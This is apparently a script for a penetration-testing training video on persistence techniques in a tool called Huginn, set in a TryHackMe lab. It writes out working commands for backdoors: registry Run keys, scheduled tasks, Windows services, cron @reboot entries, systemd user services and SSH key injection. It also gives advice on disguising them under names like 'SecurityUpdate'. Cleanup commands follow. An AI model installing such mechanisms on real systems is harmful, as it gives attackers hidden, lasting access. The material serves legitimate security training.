# VIDEO 47: Persistence Techniques
### Registry, Scheduled Tasks, Services & Crontab Persistence
**Suggested length:** 16–18 minutes
**License Tier:** Enterprise
**Certification Relevance:** OSCP: Post-Exploitation | CEH: System Hacking

---

## INTRO (0:00 – 1:30)

**[Screen: Huginn splash screen with Section 8 title card "Post-Exploitation and Privilege Escalation"]**

> "Welcome back to Section 8. In this video we're covering persistence techniques — the methods attackers use to maintain access to compromised systems across reboots and user logouts. In the previous videos, we established sessions on target machines (see Video 45: Session Management) and harvested credentials (see Video 46: Credential Harvesting). Now we're going to use those footholds and credentials to install persistence mechanisms that survive system restarts."

**[Screen: Warning banner — red background with white text: "⚠️ AUTHORIZED TESTING ONLY — LAB ENVIRONMENT — NEVER DEPLOY PERSISTENCE ON SYSTEMS YOU DO NOT OWN"]**

> "Critical safety statement before we begin. Persistence techniques are among the most legally sensitive tools in a penetration tester's arsenal. Installing backdoors, registry keys, or scheduled tasks on systems without explicit written authorization constitutes unauthorized access — a criminal offense in virtually every jurisdiction. Today's demonstration uses TryHackMe's 'Windows Privilege Escalation' room, an isolated lab environment designed for this exact purpose. In real engagements, persistence is only deployed when your scope of work explicitly authorizes it, and you must document every mechanism installed for complete cleanup at engagement close. No exceptions."

**[Screen: Huginn Enterprise tier badge — Post-Exploitation Framework module highlighted]**

> "Persistence is an Enterprise tier feature within Huginn's Post-Exploitation Framework. The module supports both Windows and Linux persistence methods — registry run keys, scheduled tasks, Windows services, crontab entries, systemd services, and SSH key injection. Let's connect to our lab target and walk through each technique."

---

## SECTION 1: Persistence Theory and Attack Surface (1:30 – 3:30)

**[Screen: Diagram showing persistence locations on Windows and Linux — registry, startup folders, scheduled tasks, services, crontab, systemd, bashrc, SSH keys]**

> "Persistence means ensuring that your access survives system events — reboots, logouts, service restarts, even credential rotations in some cases. The goal is simple: if the target machine restarts, you get your shell back without re-exploiting anything. There are dozens of persistence mechanisms on modern operating systems. Today we'll focus on the most common and reliable ones that Huginn implements."

**[Screen: Split-screen comparison — Windows persistence locations (left) vs Linux persistence locations (right)]**

> "On Windows, the primary persistence surfaces are the registry Run keys — programs that execute at user login — scheduled tasks that fire on triggers like logon or timer events, and Windows services that start automatically with the operating system. On Linux, we have crontab entries, systemd user services, bashrc and profile script injection, and SSH authorized key manipulation. Each mechanism has different stealth characteristics, privilege requirements, and detection signatures."

**[Screen: Table showing persistence methods with columns: Method, OS, Privilege Required, Stealth Level, Survivability]**

> "Here's the tradeoff matrix. Registry Run keys are low-privilege — any user can add them to HKCU — but they're easily spotted by defenders checking autoruns. Scheduled tasks offer more flexibility with triggers but require appropriate permissions. Windows services are the most persistent but typically require SYSTEM or Administrator access. On Linux, crontab is the workhorse — reliable, simple, survives reboots — while systemd services offer more sophisticated control but require write access to service directories."

| Method | OS | Privilege | Stealth | Survivability |
|--------|:---:|-----------|---------|---------------|
| Registry Run Key (HKCU) | Windows | User | Low | Reboot + Logon |
| Registry Run Key (HKLM) | Windows | Admin | Low | Reboot |
| Scheduled Task | Windows | User/Admin | Medium | Reboot + Trigger |
| Windows Service | Windows | Admin/SYSTEM | Medium | Reboot |
| Crontab | Linux | User | Low | Reboot |
| Systemd Service | Linux | Root | Medium-High | Reboot |
| SSH Key Injection | Linux | User | High | Indefinite |
| Bashrc/Profile | Linux | User | Low | Login |

---

## SECTION 2: Lab Setup — THM Windows Privilege Escalation (3:30 – 5:00)

**[Screen: TryHackMe dashboard — "Windows Privilege Escalation" room selected, machine deploying]**

> "Our target today is TryHackMe's Windows Privilege Escalation room. This gives us a Windows machine where we already have a low-privilege shell — simulating the post-exploitation scenario where you've gained initial access and now need to maintain it. Deploy the machine and note the target IP."

```bash
# Lab Setup — TryHackMe Windows Privilege Escalation
# ══════════════════════════════════════════════════
#
# Platform: TryHackMe
# Room: Windows Privilege Escalation
# Target IP: 10.10.X.X (assigned on deploy)
# Services: RDP (3389), SMB (445), WinRM (5985)
# Initial Access: Low-privilege user shell
#
# Connect via THM VPN:
# openvpn thm-vpn.ovpn
#
# Verify connectivity:
# ping 10.10.X.X
```

**[Screen: Huginn Post-Exploitation page — session established to THM target, showing active session with session ID]**

> "I already have a session established from our prior work. You can see it in Huginn's Session Manager — session ID, target IP, session type, and current privilege level. We're running as a standard user, which limits some persistence options but still gives us several viable mechanisms. Let's start with the most common Windows technique — registry Run keys."

---

## SECTION 3: Windows Registry Run Key Persistence (5:00 – 7:30)

**[Screen: Huginn Post-Exploitation → Persistence panel — "Registry Run Key" method selected]**

> "Registry Run keys are the classic Windows persistence mechanism. When a user logs in, Windows checks specific registry keys and executes any programs listed there. The HKEY_CURRENT_USER Run key doesn't require admin privileges — any user can add entries to their own profile. The HKEY_LOCAL_MACHINE Run key affects all users but requires administrative access."

**[Screen: Huginn Persistence configuration — showing registry path, value name, binary path fields]**

> "In Huginn, select 'Registry Run Key' from the persistence method dropdown. The interface shows you the target registry path — HKCU backslash Software backslash Microsoft backslash Windows backslash CurrentVersion backslash Run. The value name is what appears in autoruns tools — we're using 'SecurityUpdate' as a plausible name. The binary path points to our payload location."

```bash
# Registry Run Key Persistence
# ─────────────────────────────
# Target Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
# Value Name: SecurityUpdate
# Value Data: C:\Windows\Temp\backdoor.exe
#
# Huginn executes:
# reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"
#
# [+] Registry key added successfully
# [*] Persistence will trigger on next user logon
# [*] Method: registry_run
# [*] Privilege required: Current user (no elevation needed)
```

**[Screen: Huginn showing WinRegClient interaction — connecting to remote registry, writing key]**

> "Behind the scenes, Huginn's WinRegClient connects to the Windows Remote Registry service over RPC. It opens the HKCU hive, navigates to the Run subkey, and writes a REG_SZ value containing our payload path. This is the same operation as running reg.exe locally but executed through our remote session. The client handles the NDR encoding, RPC binding, and return code validation automatically."

**[Screen: Verification — reg query showing the new Run key entry]**

> "Let's verify. Running reg query against the Run key shows our SecurityUpdate entry pointing to the payload. When this user next logs in — after a reboot, after a logout — Windows will execute that binary automatically. Simple, reliable, but also simple to detect. Any sysadmin running Sysinternals Autoruns or checking Run keys will spot this immediately. That's why we need multiple persistence methods."

```bash
# Verification
# ────────────
# reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
#
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
#     SecurityUpdate    REG_SZ    C:\Windows\Temp\backdoor.exe
#     OneDrive          REG_SZ    "C:\Users\user\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
#
# [+] Registry persistence verified — entry present
```

---

## SECTION 4: Scheduled Task Persistence (7:30 – 10:00)

**[Screen: Huginn Post-Exploitation → Persistence panel — "Scheduled Task" method selected]**

> "Scheduled tasks offer more flexibility than registry keys. You can trigger execution on logon, at specific times, on idle, or on system events. They also provide options for running under different user contexts if you have the appropriate privileges. The task scheduler is a legitimate Windows component, so task-based persistence can blend with normal system operations."

**[Screen: Huginn Scheduled Task configuration — task name, trigger type dropdown, binary path, run level]**

> "In Huginn, select 'Scheduled Task' from the persistence methods. Configure the task name — again, something plausible like 'SecurityUpdate' or 'WindowsDefenderScheduledScan'. Set the trigger — we're using 'onlogon' which fires every time any user logs in. The binary path points to our payload, and run level can be 'limited' for user-context or 'highest' if we have admin privileges."

```bash
# Scheduled Task Persistence
# ──────────────────────────
# Task Name: SecurityUpdate
# Trigger: OnLogon (fires at every user login)
# Action: Execute C:\Windows\Temp\backdoor.exe
# Run Level: Limited (current user context)
#
# Huginn executes:
# schtasks /create /tn "SecurityUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon
#
# SUCCESS: The scheduled task "SecurityUpdate" has successfully been created.
#
# [+] Scheduled task created
# [*] Trigger: ONLOGON
# [*] Next trigger: Next user login
```

**[Screen: Huginn output showing task creation success, with task details panel]**

> "Task created successfully. The advantage here over registry keys is flexibility. We could set this to run every hour, every day at 2 AM, or only when the system goes idle. For persistence, 'onlogon' is most common because it guarantees re-execution after reboots. But a time-based trigger like 'every 15 minutes' provides faster reconnection if your session drops for other reasons."

```bash
# Alternative triggers for persistence:
# ─────────────────────────────────────
# Every 15 minutes (aggressive reconnect):
# schtasks /create /tn "SecurityUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc minute /mo 15
#
# Daily at 02:00 (stealthier):
# schtasks /create /tn "SecurityUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc daily /st 02:00
#
# On system startup (requires elevation):
# schtasks /create /tn "SecurityUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc onstart /ru SYSTEM
```

**[Screen: schtasks /query showing the created task among legitimate Windows tasks]**

> "Listing scheduled tasks shows ours alongside legitimate Windows maintenance tasks. This is where naming conventions matter for stealth — 'SecurityUpdate' or 'MicrosoftEdgeUpdateCheck' blend better than 'backdoor_task'. In a real engagement, you'd document every task name for cleanup, and your report would include the exact schtasks /delete command for removal."

---

## SECTION 5: Windows Service Persistence (10:00 – 12:30)

**[Screen: Huginn Post-Exploitation → Persistence panel — "Windows Service" method selected, showing elevated privilege indicator]**

> "Windows services are the heavyweight persistence mechanism. Services start with the operating system — before any user logs in — and run under SYSTEM context by default. This means your payload executes at boot with the highest privileges available. The tradeoff is that service creation requires administrative access, and services are monitored by endpoint detection tools."

**[Screen: Huginn Service Persistence configuration — service name, display name, binary path, start type]**

> "For service persistence, Huginn's SvcCtlClient connects to the Service Control Manager over RPC. It creates a new service entry with the specified binary path and start type. We're setting start type to 'auto' which means the service launches automatically at system boot. The service name and display name should look legitimate — we're using 'SecurityService' with a display name of 'Windows Security Monitor'."

```bash
# Windows Service Persistence
# ───────────────────────────
# Service Name: SecurityService
# Display Name: Windows Security Monitor
# Binary Path: C:\Windows\Temp\backdoor.exe
# Start Type: auto (starts at boot)
# Run As: LocalSystem
#
# Huginn executes:
# sc create "SecurityService" binpath= "C:\Windows\Temp\backdoor.exe" start= auto
# sc description "SecurityService" "Provides real-time security monitoring and threat protection"
#
# [SC] CreateService SUCCESS
#
# [+] Service 'SecurityService' created
# [*] Start type: AUTO_START
# [*] Run as: LocalSystem (SYSTEM privileges)
# [*] Will start automatically on next boot
```

**[Screen: Huginn showing SvcCtlClient RPC interaction — OpenSCManager → CreateService → CloseHandle]**

> "The SvcCtlClient performs this through the svcctl RPC interface. It opens the Service Control Manager with full access, calls CreateServiceW with our parameters, and closes the handles. The service is now registered in the Windows service database. On next boot, the Service Control Manager will start it automatically — no user login required."

```bash
# Service verification
# ────────────────────
# sc query SecurityService
#
# SERVICE_NAME: SecurityService
#         TYPE               : 10  WIN32_OWN_PROCESS
#         STATE              : 1  STOPPED
#         WIN32_EXIT_CODE    : 0  (0x0)
#         SERVICE_EXIT_CODE  : 0  (0x0)
#         CHECKPOINT         : 0x0
#         WAIT_HINT          : 0x0
#
# Service is registered but STOPPED (will start on next boot)
# To start immediately: sc start SecurityService
```

**[Screen: Comparison table — Registry vs Scheduled Task vs Service persistence]**

> "So we now have three layers of Windows persistence installed. Registry Run key fires on user logon, scheduled task fires on logon with flexible timing options, and the service fires at boot before any user logs in. Layered persistence ensures that if defenders find and remove one mechanism, the others maintain your access. In professional engagements, you document all three with exact removal commands for post-engagement cleanup."

---

## SECTION 6: Linux Crontab and Systemd Persistence (12:30 – 15:00)

**[Screen: Huginn Post-Exploitation — switching to Linux persistence methods, showing SSH persistence module]**

> "Let's switch to Linux persistence. While our primary target today is Windows, Huginn's SSHPersistence module provides comprehensive Linux persistence capabilities. These are critical for mixed-environment engagements where you've pivoted from a Windows domain to Linux servers. The principles are similar — we want execution that survives reboots — but the mechanisms differ."

```bash
# Linux Persistence Methods in Huginn
# ════════════════════════════════════
#
# SSHPersistence module supports:
# 1. Crontab entry (@reboot trigger)
# 2. Systemd user service
# 3. SSH authorized_keys injection
# 4. Bashrc/profile script injection
# 5. MOTD script persistence
# 6. SSH config modification
```

**[Screen: Huginn Linux Persistence — Crontab method selected, showing cron expression builder]**

> "Crontab is the Linux equivalent of Windows scheduled tasks. The @reboot directive tells cron to execute a command once at system startup. It's simple, reliable, and available to any user without root privileges. The downside is visibility — crontab -l shows all entries, and any administrator checking cron jobs will spot it."

```bash
# Crontab Persistence
# ───────────────────
# Method: @reboot cron entry
# Payload: Reverse shell callback
#
# Huginn executes via SSH session:
# echo "@reboot /tmp/backdoor" | crontab -
#
# Alternatively, append to existing crontab:
# (crontab -l 2>/dev/null; echo "@reboot /tmp/.cache_update") | crontab -
#
# [+] Crontab persistence installed
# [*] Trigger: System reboot
# [*] Payload: /tmp/.cache_update
# [*] User: current user (no root required)
```

**[Screen: Huginn Systemd Persistence — service file editor showing unit configuration]**

> "Systemd services offer more control. Huginn's SSHPersistence module can create a systemd user service that starts automatically. The service file defines the executable, restart behavior, and dependencies. A user-level systemd service doesn't require root — it lives in the user's home directory under .config/systemd/user/. With root access, you can install a system-wide service that starts at boot regardless of user login."

```bash
# Systemd Service Persistence
# ───────────────────────────
# Service file: ~/.config/systemd/user/cache-update.service
#
# [Unit]
# Description=Cache Update Service
# After=network.target
#
# [Service]
# Type=simple
# ExecStart=/tmp/.cache_update
# Restart=always
# RestartSec=30
#
# [Install]
# WantedBy=default.target
#
# Huginn executes:
# systemctl --user daemon-reload
# systemctl --user enable cache-update.service
# systemctl --user start cache-update.service
#
# [+] Systemd service persistence installed
# [*] Service: cache-update.service
# [*] Auto-restart: every 30 seconds on failure
# [*] Enabled at: user login (--user) or boot (system-wide)
```

**[Screen: Huginn SSH Key Injection — showing authorized_keys modification]**

> "SSH key injection is arguably the stealthiest Linux persistence method. Instead of installing a backdoor binary, you add your public key to the target's authorized_keys file. This gives you direct SSH access as that user — no passwords needed, no suspicious processes running, and it looks like legitimate SSH key authentication. Huginn's SSHPersistence module generates a fresh keypair and injects the public key."

```bash
# SSH Key Persistence
# ───────────────────
# Huginn generates keypair and injects public key:
#
# Target file: ~/.ssh/authorized_keys
# Key added: ssh-rsa AAAA...generated_key... huginn-persistence
#
# Access method:
# ssh -i ~/.huginn/persistence_key user@target
#
# [+] SSH key persistence installed
# [*] Key fingerprint: SHA256:Kx9b...
# [*] Access: Direct SSH login with private key
# [*] Stealth: High — appears as legitimate SSH auth
```

---

## SECTION 7: Persistence Management and Cleanup (15:00 – 16:30)

**[Screen: Huginn Persistence Dashboard — showing all installed persistence mechanisms across sessions, with status indicators]**

> "Huginn tracks every persistence mechanism you install. The Persistence Dashboard shows each method, the session it belongs to, when it was installed, and its current status. This is critical for two reasons: operational awareness during the engagement, and complete cleanup documentation for your report."

**[Screen: Huginn Persistence Report — exportable list with cleanup commands for each mechanism]**

> "When the engagement ends, you need to remove every persistence mechanism. Huginn generates a cleanup report with exact removal commands for each installed method. Registry keys get reg delete commands, scheduled tasks get schtasks /delete, services get sc delete, crontab entries get filtered out, and SSH keys get removed from authorized_keys. Miss one, and you've left a backdoor on a production system — which is an engagement failure."

```bash
# Persistence Cleanup Report
# ══════════════════════════
#
# Windows Cleanup Commands:
# reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /f
# schtasks /delete /tn "SecurityUpdate" /f
# sc stop SecurityService && sc delete SecurityService
# del C:\Windows\Temp\backdoor.exe
#
# Linux Cleanup Commands:
# crontab -l | grep -v ".cache_update" | crontab -
# systemctl --user stop cache-update.service
# systemctl --user disable cache-update.service
# rm ~/.config/systemd/user/cache-update.service
# sed -i '/huginn-persistence/d' ~/.ssh/authorized_keys
# rm /tmp/.cache_update
#
# [*] Total mechanisms installed: 6
# [*] Cleanup commands generated: 10
# [*] Export format: Include in final report appendix
```

**[Screen: Huginn verify_persistence output — checking each mechanism is still active]**

> "Before cleanup, use Huginn's verify_persistence function to confirm each mechanism is still active. Defenders may have already removed some — which tells you their detection capabilities. After cleanup, run verify again to confirm everything is gone. Document both the installation and removal in your engagement report."

---

## OUTRO (16:30 – end)

**[Screen: Summary card showing all persistence methods covered — Registry Run Keys, Scheduled Tasks, Windows Services, Crontab, Systemd, SSH Keys]**

> "That's persistence techniques in Huginn. We covered Windows registry Run keys for user-logon persistence, scheduled tasks for flexible trigger-based execution, Windows services for boot-level SYSTEM persistence, Linux crontab for reboot survival, systemd services for managed process persistence, and SSH key injection for stealthy long-term access. Each method has different privilege requirements, stealth profiles, and detection signatures."

**[Screen: Ethics reminder — "Document Everything. Clean Everything. Report Everything."]**

> "Remember — persistence is only deployed within your authorized scope, every mechanism is documented for cleanup, and your final report includes verification that all persistence has been removed. In the next video, we'll use our established persistence and harvested credentials to perform lateral movement — moving from our initial foothold to other systems in the network (see Video 48: Lateral Movement). For additional practice, try the THM 'Windows Privilege Escalation' room and the 'Linux PrivEsc' room to experiment with these techniques in isolated environments."

**[Screen: Huginn logo with "Enterprise Tier — Post-Exploitation Framework" and certification badges: OSCP Post-Exploitation, CEH System Hacking]**

> "This is an Enterprise tier feature. Persistence techniques map to the OSCP Post-Exploitation domain and the CEH System Hacking domain. Practice on HTB machines like 'Bastion' and 'Forest' for Windows persistence scenarios, and 'OpenAdmin' or 'Traverxec' for Linux persistence practice. See you in Video 48."

---

## License Tier Reference

| Feature | Required Tier |
|---------|---------------|
| Registry Run Key Persistence | Enterprise |
| Scheduled Task Persistence | Enterprise |
| Windows Service Persistence | Enterprise |
| Crontab Persistence | Enterprise |
| Systemd Service Persistence | Enterprise |
| SSH Key Persistence | Enterprise |
| Persistence Dashboard | Enterprise |
| Cleanup Report Generation | Enterprise |
